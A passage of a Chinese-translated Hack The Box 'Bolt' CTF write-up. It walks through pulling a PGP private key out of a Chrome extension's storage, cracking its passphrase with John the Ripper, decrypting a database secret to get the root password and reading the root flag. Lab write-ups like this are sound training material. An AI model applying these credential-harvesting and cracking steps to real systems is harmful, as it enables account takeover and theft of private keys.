jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我们在他的个人文件夹里发现了一个谷歌Chrome的个人资料，这肯定是可疑的。我们还找到了他邮件的位置，让我们来看看:</p><figure class="lk ll lm ln gt lo gh gi paragraph-image"><div role="button" tabindex="0" class="mb mc di md bf me"><div class="gh gi ni"><img src="../Images/12fe470bbea90f5de3bd531c51189c7e.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*tSgZTh6u5A9s9XSp1ndOww.png"/></div></div><figcaption class="lr ls gj gh gi lt lu bd b be z dk translated">埃迪邮件找到了</figcaption></figure><h1 id="1e17" class="kl km iq bd kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li bi translated">PGP私钥</h1><p id="946b" class="pw-post-body-paragraph jn jo iq jp b jq lv js jt ju lw jw jx jy lx ka kb kc ly ke kf kg lz ki kj kk ij bi translated">一个很大的线索是Eddie用Chrome存储了一个私钥。让我们在他的主文件夹中搜索包含标准PGP密钥的文件:</p><pre class="lk ll lm ln gt mk ml mm mn aw mo bi"><span id="0c7f" class="mp km iq ml b gy mq mr l ms mt">eddie@bolt:~$ grep -rn 'BEGIN PGP PRIVATE KEY BLOCK'<br/>.config/google-chrome/Default/Extensions/didegimhafipceonhjepacocaffmoppf/3.0.5_0/index.min.js:27039:const PRIVATE_HEADER = '-----BEGIN PGP PRIVATE KEY BLOCK-----';<br/>.config/google-chrome/Default/Extensions/didegimhafipceonhjepacocaffmoppf/3.0.5_0/vendors/openpgp.js:32061:            // BEGIN PGP PRIVATE KEY BLOCK<br/>.config/google-chrome/Default/Extensions/didegimhafipceonhjepacocaffmoppf/3.0.5_0/vendors/openpgp.js:32409:      result.push("-----BEGIN PGP PRIVATE KEY BLOCK-----\r\n");<br/>Binary file .config/google-chrome/Default/Local Extension Settings/didegimhafipceonhjepacocaffmoppf/000003.log matches</span></pre><p id="2b1d" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">二进制文件000003.log匹配。让我们看看里面:</p><pre class="lk ll lm ln gt mk ml mm mn aw mo bi"><span id="eedf" class="mp km iq ml b gy mq mr l ms mt">eddie@bolt:~$ cat '.config/google-chrome/Default/Local Extension Settings/didegimhafipceonhjepacocaffmoppf/000003.log'<br/>&lt;SNIP&gt;                                  <br/>-----BEGIN PGP PRIVATE KEY BLOCK-----\\r\\nVersion: OpenPGP.js v4.10.9\\r\\nComment: https://openpgpjs.org\\r\\n\\r\\nxcMGBGA4G2EBCADbpIGoMv+O5sxsbYX3ZhkuikEiIbDL8JRvLX/<br/>r1KlhWlTi\\r\\nfjfUozTU9a0OLuiHUNeEjYIVdcaAR89lVBnYuoneAghZ7eaZuiLz+5gaYczk\\r\\ncpRETcVDVVMZrLlW4zhA9OXfQY/d4/OXaAjsU9w+8ne0A5I0aygN2OPnEKhU\\r\\nRNa6PCvADh22J5vD+/RjPrmpnHcUuj+/<br/>qtJrS6PyEhY6jgxmeijYZqGkGeWU\\r\\n+XkmuFNmq6km9pCw+MJGdq0b9yEKOig6/UhGWZCQ7RKU1jzCbFOvcD98YT9a\\r\\nIf70XnI0xNMS4iRVzd2D4zliQx9d6BqEqZDfZhYpWo3NbDqsyGGtbyJlABEB\\r\\nAAH+CQMINK+e85VtWtjguB8IR<br/>&lt;SNIP&gt;<br/>9CGuPrOfIaQtuP25S/RLVDl8XHvzPm\\r\\noRdF7iu8ULcA9gTxPn8DNbtdZEnFHHOANAHnIFGgYS4vj3Dj9Q3CEZSSVvwg\\r\\n6599FMcw9nGzypVOgqgQv8JGmIUeCipD10k8nHW7m9YBfQB04y9wJw99WNw/\\r\\nIc3vdhZ6NvsmLzYI21dnWD287sPj2tKAuhI0AqCEkiRwb4Z4CSGgJ5TgGML8\\r\\n11Izrkqamzpc6mKBGi213tYH6xel3nDJv5TKm3AGwXsAhJjJw+9K0MNARKCm\\r\\nYZFGLdtA/qMajW4/+T3DJ79YwPQOtCrFyHiWoIOTWfs4UhiUJIE4dTSsT/W0\\r\\nPSwYYWlAywj5\\r\\n=cqxZ\\r\\n-----END PGP PRIVATE KEY BLOCK-----</span></pre><p id="2443" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我们可以在文件中看到完整的私钥。剪切开始和结束部分之间的块，并粘贴/回显到Kali上的一个文件，如下所示:</p><pre class="lk ll lm ln gt mk ml mm mn aw mo bi"><span id="3e33" class="mp km iq ml b gy mq mr l ms mt">┌──(root💀kali)-[~/htb/bolt]<br/>└─# cat eddie_private_key                                         <br/>-----BEGIN PGP PRIVATE KEY BLOCK-----\\r\\nVersion: OpenPGP.js v4.10.9\\r\\nComment: https://openpgpjs.org\\r\\n\\r\\nxcMGBGA4G2EBCADbpIGoMv+O5sxsbYX3ZhkuikEiIbDL8JRvLX/<br/>r1KlhWlTi\\r\\nfjfUozTU9a0OLuiHUNeEjYIVdcaAR89lVBnYuoneAghZ7eaZuiLz+5gaYczk\\r\\ncpRETcVDVVMZrLlW4zhA9OXfQY/d4/OXaAjsU9w+8ne0A5I0aygN2OPnEKhU\\r\\nRNa6PCvADh22J5vD+/RjPrmpnHcUuj+/<br/>&lt;SNIP&gt;<br/>\\r\\nIc3vdhZ6NvsmLzYI21dnWD287sPj2tKAuhI0AqCEkiRwb4Z4CSGgJ5TgGML8\\r\\n11Izrkqamzpc6mKBGi213tYH6xel3nDJv5TKm3AGwXsAhJjJw+9K0MNARKCm\\r\\nYZFGLdtA/qMajW4/+T3DJ79YwPQOtCrFyHiWoIOTWfs4UhiUJIE4dTSsT/W0\\r\\nPSwYYWlAywj5\\r\\n=cqxZ\\r\\n-----END PGP PRIVATE KEY BLOCK-----</span></pre><p id="a712" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">现在使用SED删除多余的\r和\n:</p><pre class="lk ll lm ln gt mk ml mm mn aw mo bi"><span id="0f9d" class="mp km iq ml b gy mq mr l ms mt">┌──(root💀kali)-[~/htb/bolt]<br/>└─# cat eddie_private_key | sed 's/\\\\r\\\\n/\n/g' &gt; eddie_id_rsa<br/><br/>┌──(root💀kali)-[~/htb/bolt]<br/>└─# cat eddie_id_rsa                                              <br/>-----BEGIN PGP PRIVATE KEY BLOCK-----<br/>Version: OpenPGP.js v4.10.9<br/>Comment: https://openpgpjs.org<br/><br/>xcMGBGA4G2EBCADbpIGoMv+O5sxsbYX3ZhkuikEiIbDL8JRvLX/r1KlhWlTi<br/>&lt;SNIP&gt;<br/>11Izrkqamzpc6mKBGi213tYH6xel3nDJv5TKm3AGwXsAhJjJw+9K0MNARKCm<br/>YZFGLdtA/qMajW4/+T3DJ79YwPQOtCrFyHiWoIOTWfs4UhiUJIE4dTSsT/W0<br/>PSwYYWlAywj5<br/>=cqxZ<br/>-----END PGP PRIVATE KEY BLOCK-----</span></pre><h1 id="d427" class="kl km iq bd kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li bi translated">开膛手约翰</h1><p id="0e95" class="pw-post-body-paragraph jn jo iq jp b jq lv js jt ju lw jw jx jy lx ka kb kc ly ke kf kg lz ki kj kk ij bi translated">我们可以用JohnTheRipper试着破解私钥。首先转换成John可以使用的散列:</p><pre class="lk ll lm ln gt mk ml mm mn aw mo bi"><span id="0fe8" class="mp km iq ml b gy mq mr l ms mt">┌──(root💀kali)-[~/htb/bolt]<br/>└─# john eddie_pgp_hash --format=gpg --wordlist=/usr/share/wordlists/rockyou.txt<br/>Using default input encoding: UTF-8<br/>Loaded 1 password hash (gpg, OpenPGP / GnuPG Secret Key [32/64])<br/>Cost 1 (s2k-count) is 16777216 for all loaded hashes<br/>Cost 2 (hash algorithm [1:MD5 2:SHA1 3:RIPEMD160 8:SHA256 9:SHA384 10:SHA512 11:SHA224]) is 8 for all loaded hashes<br/>Cost 3 (cipher algorithm [1:IDEA 2:3DES 3:CAST5 4:Blowfish 7:AES128 8:AES192 9:AES256 10:Twofish 11:Camellia128 12:Camellia192 13:Camellia256]) is 9 for all loaded hashes<br/>Will run 4 OpenMP threads<br/>Press 'q' or Ctrl-C to abort, almost any other key for status<br/>&lt;HIDDEN&gt;   (Eddie Johnson)<br/>1g 0:00:07:50 DONE (2021-10-26 22:31) 91.02C/s mhines..menudo<br/>Session completed</span></pre><h1 id="9496" class="kl km iq bd kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li bi translated">MySQL访问</h1><p id="3eba" class="pw-post-body-paragraph jn jo iq jp b jq lv js jt ju lw jw jx jy lx ka kb kc ly ke kf kg lz ki kj kk ij bi translated">这很简单，但是我们需要这个做什么？回头看看我们之前找到的passbolt.php文件，我们有没有尝试过的数据库凭证。现在让我们看看那里:</p><figure class="lk ll lm ln gt lo gh gi paragraph-image"><div role="button" tabindex="0" class="mb mc di md bf me"><div class="gh gi nj"><img src="../Images/5764b4e8f8183947dae87f6041c0e0b2.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*WmKbMf2zsz3haZRj6NqSzw.png"/></div></div><figcaption class="lr ls gj gh gi lt lu bd b be z dk translated">浏览mysql数据库</figcaption></figure><h1 id="97cd" class="kl km iq bd kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li bi translated">PGP消息</h1><p id="f073" class="pw-post-body-paragraph jn jo iq jp b jq lv js jt ju lw jw jx jy lx ka kb kc ly ke kf kg lz ki kj kk ij bi translated">我们找到一个名为secrets的表，其中有一条用我们刚刚破解的私钥加密的消息。从数据库中复制PGP消息，并粘贴到Kali:</p><pre class="lk ll lm ln gt mk ml mm mn aw mo bi"><span id="dd5e" class="mp km iq ml b gy mq mr l ms mt">┌──(root💀kali)-[~/htb/bolt]<br/>└─# cat eddie_pgp_message <br/>-----BEGIN PGP MESSAGE-----<br/>Version: OpenPGP.js v4.10.9<br/>Comment: https://openpgpjs.org<br/><br/>wcBMA/ZcqHmj13/kAQgAkS/2GvYLxglAIQpzFCydAPOj6QwdVV5BR17W5psc<br/>g/ajGlQbkE6wgmpoV7HuyABUjgrNYwZGN7ak2Pkb+/3LZgtpV/PJCAD030kY<br/>&lt;SNIP&gt;<br/>nO9/aqEQ+2tE60QFsa2dbAAn7QKk8VE2B05jBGSLa0H7xQxshwSQYnHaJCE6<br/>TQtOIti4o2sKEAFQnf7RDgpWeugbn/vphihSA984<br/>=P38i<br/>-----END PGP MESSAGE-----</span></pre><p id="d332" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">现在我们有了用PGP加密的信息，以及解码它的密码，现在我们已经破解了私钥。所以我们可以很容易地解密文件来查看内容，首先导入私钥:</p><pre class="lk ll lm ln gt mk ml mm mn aw mo bi"><span id="b4da" class="mp km iq ml b gy mq mr l ms mt">┌──(root💀kali)-[~/htb/bolt]<br/>└─# gpg --import eddie_pgp_priv_key</span></pre><p id="8a70" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">弹出一个窗口，输入我们刚刚破解的密码:</p><pre class="lk ll lm ln gt mk ml mm mn aw mo bi"><span id="3190" class="mp km iq ml b gy mq mr l ms mt">┌────────────────────────────────────────────────────────────────┐<br/>│ Please enter the passphrase to import the OpenPGP secret key:  │<br/>│ "Eddie Johnson &lt;eddie@bolt.htb&gt;"                               │<br/>│ 2048-bit RSA key, ID 1C2741A3DC3B4ABD,                         │<br/>│ created 2021-02-25.                                            │<br/>│                                                                │<br/>│                                                                │<br/>│ Passphrase: **************____________________________________ │<br/>│                                                                │<br/>│         &lt;OK&gt;                                    &lt;Cancel&gt;       │<br/>└────────────────────────────────────────────────────────────────┘</span></pre><p id="0bdb" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我们看到密钥被导入:</p><pre class="lk ll lm ln gt mk ml mm mn aw mo bi"><span id="4d7e" class="mp km iq ml b gy mq mr l ms mt">gpg: /root/.gnupg/trustdb.gpg: trustdb created<br/>gpg: key 1C2741A3DC3B4ABD: public key "Eddie Johnson &lt;eddie@bolt.htb&gt;" imported<br/>gpg: key 1C2741A3DC3B4ABD: secret key imported<br/>gpg: Total number processed: 1<br/>gpg:               imported: 1<br/>gpg:       secret keys read: 1<br/>gpg:   secret keys imported: 1</span></pre><p id="c08f" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">现在解密我们从盒子上的秘密表中复制的信息:</p><pre class="lk ll lm ln gt mk ml mm mn aw mo bi"><span id="ede0" class="mp km iq ml b gy mq mr l ms mt">┌──(root💀kali)-[~/htb/bolt]<br/>└─# gpg -d eddie_pgp_message</span></pre><p id="3b63" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">窗口再次弹出，再次输入或破解密码:</p><pre class="lk ll lm ln gt mk ml mm mn aw mo bi"><span id="e72f" class="mp km iq ml b gy mq mr l ms mt">┌────────────────────────────────────────────────────────────────┐<br/>│ Please enter the passphrase to unlock the OpenPGP secret key:  │<br/>│ "Eddie Johnson &lt;eddie@bolt.htb&gt;"                               │<br/>│ 2048-bit RSA key, ID F65CA879A3D77FE4,                         │<br/>│ created 2021-02-25 (main key ID 1C2741A3DC3B4ABD).             │<br/>│                                                                │<br/>│                                                                │<br/>│ Passphrase: **************____________________________________ │<br/>│                                                                │<br/>│         &lt;OK&gt;                                    &lt;Cancel&gt;       │<br/>└────────────────────────────────────────────────────────────────┘</span></pre><p id="a194" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">现在我们看到了消息的内容:</p><pre class="lk ll lm ln gt mk ml mm mn aw mo bi"><span id="8cc1" class="mp km iq ml b gy mq mr l ms mt">gpg: encrypted with 2048-bit RSA key, ID F65CA879A3D77FE4, created 2021-02-25<br/>      "Eddie Johnson &lt;eddie@bolt.htb&gt;"<br/>{"password":"&lt;HIDDEN&gt;","description":""}gpg: Signature made Sat 06 Mar 2021 03:33:54 PM GMT<br/>gpg:                using RSA key 1C2741A3DC3B4ABD<br/>gpg: Good signature from "Eddie Johnson &lt;eddie@bolt.htb&gt;" [unknown]<br/>gpg: WARNING: This key is not certified with a trusted signature!<br/>gpg:          There is no indication that the signature belongs to the owner.<br/>Primary key fingerprint: DF42 6BC7 A4A8 AF58 E50E  DA0E 1C27 41A3 DC3B 4ABD</span></pre><h1 id="e029" class="kl km iq bd kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li bi translated">根标志</h1><p id="75e0" class="pw-post-body-paragraph jn jo iq jp b jq lv js jt ju lw jw jx jy lx ka kb kc ly ke kf kg lz ki kj kk ij bi translated">我们有另一个密码，这次是给root的。我们可以切换用户并获取标志:</p><pre class="lk ll lm ln gt mk ml mm mn aw mo bi"><span id="6bcd" class="mp km iq ml b gy mq mr l ms mt">eddie@bolt:~$ su<br/>Password: <br/><br/>root@bolt:/home/eddie# id<br/>uid=0(root) gid=0(root) groups=0(root)<br/><br/>root@bolt:/home/eddie# cat /root/root.txt<br/>&lt;HIDDEN&gt;</span></pre></div><div class="ab cl nk nl hu nm" role="separator"><span class="nn bw bk no np nq"/><span class="nn bw bk no np nq"/><span class="nn bw bk no np"/></div><div class="ij ik il im in"><p id="fafb" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">如果你喜欢这篇文章，请给我一两个掌声(这是免费的！)</p><p id="d387" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">推特—<a class="ae nd" href="https://twitter.com/pencer_io" rel="noopener ugc nofollow" target="_blank">https://twitter.com/pencer_io</a><br/>网站— <a class="ae nd" href="https://pencer.io/" rel="noopener ugc nofollow" target="_blank"> https://pencer.io </a></p><p id="5c54" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><em class="nr">原载于2022年2月21日</em><a class="ae nd" href="https://pencer.io/ctf/ctf-htb-bolt/" rel="noopener ugc nofollow" target="_blank"><em class="nr">https://pencer . io</em></a><em class="nr">。</em></p></div><div class="ab cl nk nl hu nm" role="separator"><span class="nn bw bk no np nq"/><span class="nn bw bk no np nq"/><span class="nn bw bk no np"/></div><div class="ij ik il im in"><h1 id="e5e8" class="kl km iq bd kn ko ns kq kr ks nt ku kv kw nu ky kz la nv lc ld le nw lg lh li bi translated">🔈 🔈Infosec Writeups正在组织其首次虚拟会议和网络活动。如果你对信息安全感兴趣，这是最酷的地方，有16个令人难以置信的演讲者和10多个小时充满力量的讨论会议。<a class="ae nd" href="https://iwcon.live/" rel="noopener ugc nofollow" target="_blank">查看更多详情并在此注册。</a></h1><div class="nx ny gp gr nz oa"><a href="https://iwcon.live/" rel="noopener  ugc nofollow" target="_blank"><div class="ob ab fo"><div class="oc ab od cl cj oe"><h2 class="bd ir gy z fp of fr fs og fu fw ip bi translated">IWCon2022 - Infosec书面报告虚拟会议</h2><div class="oh l"><h3 class="bd b gy z fp of fr fs og fu fw dk translated">与世界上最优秀的信息安全专家建立联系。了解网络安全专家如何取得成功。将新技能添加到您的…</h3></div><div class="oi l"><p class="bd b dl z fp of fr fs og fu fw dk translated">iwcon.live</p></div></div><div class="oj l"><div class="ok l ol om on oj oo lp oa"/></div></div></a></div></div></div>    
</body>
</html>